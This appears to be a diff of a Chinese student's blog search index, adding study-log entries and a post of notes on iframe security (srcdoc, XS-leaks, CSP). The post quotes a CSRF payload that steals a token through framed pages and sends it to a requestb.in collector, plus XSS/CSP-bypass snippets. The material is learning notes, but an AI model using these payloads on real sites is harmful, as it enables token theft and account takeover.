@@ -483,6 +483,7 @@
 </tr>
 </tbody></table>
 <h2 id="day10-4-21"><a href="#day10-4-21" class="headerlink" title="day10 4.21"></a>day10 4.21</h2><p>貌似最近都没搞实验室的东西 要抽时间搞一下了</p>
+<p>真是服了 越是水课 越是b事多 中国computer education真是lj</p>
 <table>
 <thead>
 <tr>
@@ -492,11 +493,11 @@
 </thead>
 <tbody><tr>
 <td>看一下学者给的数据集和代码</td>
-<td></td>
+<td>Y</td>
 </tr>
 <tr>
 <td>听一节星盟的pwn课</td>
-<td></td>
+<td>Y</td>
 </tr>
 </tbody></table>
 <h2 id="长期任务"><a href="#长期任务" class="headerlink" title="长期任务"></a>长期任务</h2><table>
@@ -735,9 +736,26 @@
   <entry>
     <title>window.open 相关知识</title>
     <url>/2022/04/14/window-open/</url>
-    <content><![CDATA[<p>先开个天坑 过几天补上</p>
-<p>收获大佬博客 +1</p>
-<p><a href="https://blog.huli.tw/2022/04/07/iframe-and-window-open/">https://blog.huli.tw/2022/04/07/iframe-and-window-open/</a></p>
+    <content><![CDATA[<p>收获大佬博客 +1  跟大佬学xss</p>
+<span id="more"></span>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.huli.tw/2022/04/07/iframe-and-window-open/">https://blog.huli.tw/2022/04/07/iframe-and-window-open/</a></p>
 ]]></content>
       <categories>
         <category>web</category>
@@ -933,5 +951,58 @@
 <p><a href="https://lightless.me/archives/same-origin-method-exection.html#_label0">https://lightless.me/archives/same-origin-method-exection.html#_label0</a></p>
 <p><a href="https://xz.aliyun.com/t/8075">https://xz.aliyun.com/t/8075</a></p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>iframe相关知识总结</title>
+    <url>/2022/04/22/iframe-learn/</url>
+    <content><![CDATA[<p>总结iframe相关知识 半年前就想总结 奈何见识太少 害（half done</p>
+<span id="more"></span>
+
+<h1 id="iframe相关知识"><a href="#iframe相关知识" class="headerlink" title="iframe相关知识"></a>iframe相关知识</h1><p><code>iframe</code>常见用法: <a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe">https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe</a></p>
+<h2 id="属性介绍"><a href="#属性介绍" class="headerlink" title="属性介绍"></a>属性介绍</h2><h3 id="loading"><a href="#loading" class="headerlink" title="loading"></a><code>loading</code></h3><p>Indicates how the browser should load the iframe:</p>
+<ul>
+<li><code>eager</code>: Load the iframe immediately, regardless if it is outside the visible viewport (this is the default value).</li>
+<li><code>lazy</code>: Defer loading of the iframe until it reaches a calculated distance from the viewport, as defined by the browser.</li>
+</ul>
+<p>用法 在LINECTF2022中  当<code>loading=lazy</code> 时  可以<code>scroll-to-text-fragment</code>结合缓存来进行xsleak</p>
+<p>more：<a href="https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/">https://xsleaks.dev/docs/attacks/experiments/scroll-to-text-fragment/</a></p>
+<h3 id="src"><a href="#src" class="headerlink" title="src"></a><code>src</code></h3><p>The URL of the page to embed. Use a value of <code>about:blank</code> to embed an empty page that conforms to the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy#inherited_origins">same-origin policy</a>. Also note that programmatically removing an <code>&lt;iframe&gt;</code>‘s src attribute (e.g. via <a href="https://developer.mozilla.org/en-US/docs/Web/API/Element/removeAttribute"><code>Element.removeAttribute()</code></a>) causes <code>about:blank</code> to be loaded in the frame in Firefox (from version 65), Chromium-based browsers, and Safari/iOS.</p>
+<h3 id="srcdoc"><a href="#srcdoc" class="headerlink" title="srcdoc"></a><code>srcdoc</code></h3><p>Inline HTML to embed, overriding the <code>src</code> attribute. If a browser does not support the <code>srcdoc</code> attribute, it will fall back to the URL in the <code>src</code> attribute.</p>
+<blockquote>
+<p>除了常用的src 属性以外，还有另一个属性叫做srcdoc，里面放的值就是iframe 的内容，跟src + data URI 其实有点类似：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span></span></span><br><span class="line"><span class="tag">  <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;h1&gt;hello&lt;/h1&gt;&lt;script&gt;alert(top.document.body)&lt;/script&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  </span><br></pre></td></tr></table></figure>
+
+
+
+<p>但是有个决定性的差异，那就是iframe + srcdoc 所产生的window，它的origin 会继承上层，跟data URI 会变成null origin 不同。也就是说，上面这段程式码可以存取到上层的DOM 元素，因为他们是same origin。</p>
+<p>另外，srcdoc 并不受CSP 的 <code>frame-src</code> 影响，就像iframe 的src 如果是 <code>javascript:</code> 的话，是受 <code>script-src</code> 管而不是 <code>frame-src</code> 管，细节可看这里：<a href="https://csplite.com/csp/test188/">Test of CSP: iframe srcdoc=’…’ is not governed by frame-src</a></p>
+<p>还有，由于srcdoc 是HTML attribute 的关系，所以内容就跟之前提过的一样，可以是encode 过的结果，像这样：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;<span class="symbol">&amp;lt;</span>script<span class="symbol">&amp;gt;</span>alert(1)<span class="symbol">&amp;lt;</span>/script<span class="symbol">&amp;gt;</span>&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>所以如果iframe srcdoc 的属性可控，就算内容有先escape 过也没有用，还是会被解析回原本的符号来执行。</p>
+</blockquote>
+<h2 id="CSRF中的利用"><a href="#CSRF中的利用" class="headerlink" title="CSRF中的利用"></a>CSRF中的利用</h2><p><strong>Steal token and send it using 2 iframes</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> token;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">readframe1</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  token = frame1.<span class="property">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;profile&quot;</span>).<span class="property">token</span>.<span class="property">value</span>;</span></span><br><span class="line"><span class="language-javascript">  <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;bypass&quot;</span>).<span class="property">token</span>.<span class="property">value</span> = token</span></span><br><span class="line"><span class="language-javascript">  <span class="title function_">loadframe2</span>();</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">loadframe2</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> test = <span class="variable language_">document</span>.<span class="title function_">getElementbyId</span>(<span class="string">&quot;frame2&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  test.<span class="property">src</span> = <span class="string">&quot;http://requestb.in/1g6asbg1?token=&quot;</span>+token;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;frame1&quot;</span> <span class="attr">name</span>=<span class="string">&quot;frame1&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://google.com?param=VALUE&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;readframe1()&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">sandbox</span>=<span class="string">&quot;allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">height</span>=<span class="string">&quot;600&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;frame2&quot;</span> <span class="attr">name</span>=<span class="string">&quot;frame2&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">sandbox</span>=<span class="string">&quot;allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">height</span>=<span class="string">&quot;600&quot;</span> <span class="attr">width</span>=<span class="string">&quot;800&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;document.forms[0].submit()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;bypass&quot;</span> <span class="attr">name</span>&quot;<span class="attr">bypass</span>&quot; <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">target</span>=<span class="string">&quot;frame2&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://google.com?param=VALUE&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;z&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;checkbox&quot;</span> <span class="attr">name</span>=<span class="string">&quot;status&quot;</span> <span class="attr">checked</span>=<span class="string">&quot;&quot;</span>&gt;</span>        </span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;token&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;0000&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>Submit<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>记得当时复现一个2020年的国外比赛 有空再找找 貌似用到了这个知识点（找到了</p>
+<p><a href="https://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/">https://www.sigflag.at/blog/2020/writeup-bytebandits2020-notes-app/</a></p>
+<p>笔记在我的F盘xss目录下</p>
+<p>我记得当时复现过了 抽时间再瞅瞅</p>
+<p><a href="https://portswigger.net/research/abusing-chromes-xss-auditor-to-steal-tokens">https://portswigger.net/research/abusing-chromes-xss-auditor-to-steal-tokens</a></p>
+<h2 id="iframe-in-xss-and-csp"><a href="#iframe-in-xss-and-csp" class="headerlink" title="iframe in xss and csp"></a>iframe in xss and csp</h2><p>The <code>self</code> value of <code>script-src</code> won’t allow the execution of the JS code using the <code>data:</code> protocol or the <code>srcdoc</code> attribute. However, even the <code>none</code> value of the CSP will allow the execution of the iframes that put a URL (complete or just the path) in the <code>src</code> attribute. Therefore it’s possible to bypass the CSP of a page with:</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;script-src &#x27;sha256-iF/bMbiFXal+AAl9tF8N6+KagNWdMlnhLqWkjAocLsk=&#x27;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> secret = <span class="string">&quot;31337s3cr37t&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;if1&quot;</span> <span class="attr">src</span>=<span class="string">&quot;child.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;if2&quot;</span> <span class="attr">src</span>=<span class="string">&quot;http://127.0.1.1:8000/child.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;if3&quot;</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script&gt;var secret=&#x27;if3 secret!&#x27;; alert(parent.secret)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">&quot;if4&quot;</span> <span class="attr">src</span>=<span class="string">&quot;data:text/html;charset=utf-8,%3Cscript%3Evar%20secret=&#x27;if4%20secret!&#x27;;alert(parent.secret)%3C%2Fscript%3E&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Iframes-with-CSP"><a href="#Iframes-with-CSP" class="headerlink" title="Iframes with CSP"></a>Iframes with CSP</h3><p><a href="https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp#iframes-in-xss">https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp#iframes-in-xss</a></p>
+]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>xss</tag>
+      </tags>
   </entry>
 </search>
